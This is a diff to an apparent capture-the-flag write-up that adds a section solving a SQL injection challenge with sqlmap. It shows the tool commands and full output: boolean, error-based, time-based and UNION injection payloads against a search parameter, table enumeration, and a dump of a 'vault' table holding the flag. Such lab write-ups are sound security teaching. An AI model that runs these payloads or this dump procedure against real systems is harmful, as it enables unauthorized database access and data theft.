@@ -214,6 +214,251 @@ The output of that was
 
   - The flag was found
 
+__Alternative__
+
+- This could be done easily just using sqlmap
+
+```
+s24@s24:~$ sqlmap --tables -u http://sqli2.chal.deti:8031 --form            
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.6#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:21:22 /2026-10-20/
+
+[11:21:22] [INFO] testing connection to the target URL
+[11:21:22] [INFO] searching for forms
+[1/1] Form:
+GET http://sqli2.chal.deti:8031/search?q=
+do you want to test this form? [Y/n/q] 
+> Y
+Edit GET data [default: q=]: 
+
+do you want to fill blank fields with random values? [Y/n] 
+
+[11:21:33] [INFO] resuming back-end DBMS 'mysql' 
+[11:21:33] [INFO] using '/home/student/.local/share/sqlmap/output/results-10202026_1121am.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: q=-4425' OR 7140=7140#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: q=Ejth' AND (SELECT 8176 FROM(SELECT COUNT(*),CONCAT(0x716a7a7a71,(SELECT (ELT(8176=8176,1))),0x717a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qFGz
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: q=Ejth' AND (SELECT 9984 FROM (SELECT(SLEEP(5)))JFby)-- AzsU
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: q=Ejth' UNION ALL SELECT 78,CONCAT(0x716a7a7a71,0x434142776665524762625966424a6f584256524548577346545a4767666965775079486d46695947,0x717a716b71),78,78#
+---
+do you want to exploit this SQL injection? [Y/n] 
+
+[11:21:36] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:21:36] [INFO] fetching database names
+[11:21:36] [WARNING] reflective value(s) found and filtering out
+[11:21:36] [INFO] fetching tables for databases: 'appdb, information_schema'
+Database: information_schema
+[85 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| FILES                                 |
+| GEOMETRY_COLUMNS                      |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TABLESPACES_ENCRYPTION         |
+| INNODB_TRX                            |
+| KEYWORDS                              |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| KEY_PERIOD_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PERIODS                               |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SEQUENCES                             |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| SLAVE_STATUS                          |
+| SPATIAL_REF_SYS                       |
+| SQL_FUNCTIONS                         |
+| STATISTICS                            |
+| SYSTEM_VARIABLES                      |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| THREAD_POOL_GROUPS                    |
+| THREAD_POOL_QUEUES                    |
+| THREAD_POOL_STATS                     |
+| THREAD_POOL_WAITS                     |
+| USERS                                 |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| OPTIMIZER_COSTS                       |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
+| user_variables                        |
++---------------------------------------+
+
+Database: appdb
+[2 tables]
++---------------------------------------+
+| products                              |
+| vault                                 |
++---------------------------------------+
+
+```
+
+- This gives information about the tables
+
+- Now to get the flag
+
+```
+24@s24:~$ sqlmap --columns -u http://sqli2.chal.deti:8031 --form -C secret --dump
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.6#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:24:23 /2026-10-20/
+
+[11:24:23] [INFO] testing connection to the target URL
+[11:24:23] [INFO] searching for forms
+[1/1] Form:
+GET http://sqli2.chal.deti:8031/search?q=
+do you want to test this form? [Y/n/q] 
+> 
+
+Edit GET data [default: q=]: 
+
+do you want to fill blank fields with random values? [Y/n] 
+
+[11:24:25] [INFO] resuming back-end DBMS 'mysql' 
+[11:24:25] [INFO] using '/home/student/.local/share/sqlmap/output/results-10202026_1124am.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: q=-4425' OR 7140=7140#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: q=Ejth' AND (SELECT 8176 FROM(SELECT COUNT(*),CONCAT(0x716a7a7a71,(SELECT (ELT(8176=8176,1))),0x717a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qFGz
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: q=Ejth' AND (SELECT 9984 FROM (SELECT(SLEEP(5)))JFby)-- AzsU
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: q=Ejth' UNION ALL SELECT 78,CONCAT(0x716a7a7a71,0x434142776665524762625966424a6f584256524548577346545a4767666965775079486d46695947,0x717a716b71),78,78#
+---
+do you want to exploit this SQL injection? [Y/n] 
+
+[11:24:26] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:24:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[11:24:26] [INFO] fetching current database
+[11:24:26] [INFO] fetching tables for database: 'appdb'
+[11:24:26] [INFO] fetching columns 'secret' for table 'vault' in database 'appdb'
+[11:24:26] [INFO] fetching columns 'secret' for table 'products' in database 'appdb'
+[11:24:26] [WARNING] reflective value(s) found and filtering out
+[11:24:26] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+Database: appdb
+Table: vault
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| secret | varchar(128) |
++--------+--------------+
+
+[11:24:26] [INFO] fetching entries of column(s) 'secret' for table 'vault' in database 'appdb'
+Database: appdb
+Table: vault
+[1 entry]
++----------------------------------------+
+| secret                                 |
++----------------------------------------+
+| flag{9d5b04dc2f92bd9b428e955a5fd89909} |
++----------------------------------------+
+
+[11:24:26] [INFO] table 'appdb.vault' dumped to CSV file '/home/student/.local/share/sqlmap/output/sqli2.chal.deti/dump/appdb/vault.csv'
+[11:24:26] [INFO] fetching entries of column(s) 'secret' for table 'products' in database 'appdb'
+[11:24:26] [WARNING] the SQL query provided does not return any output
+[11:24:27] [WARNING] the SQL query provided does not return any output
+[11:24:27] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[11:24:27] [INFO] fetching number of column(s) 'secret' entries for table 'products' in database 'appdb'
+[11:24:27] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[11:24:27] [INFO] retrieved: 12
+Database: appdb
+
+```
+
 ## Reproduce
 
 - Go to search bar and put there
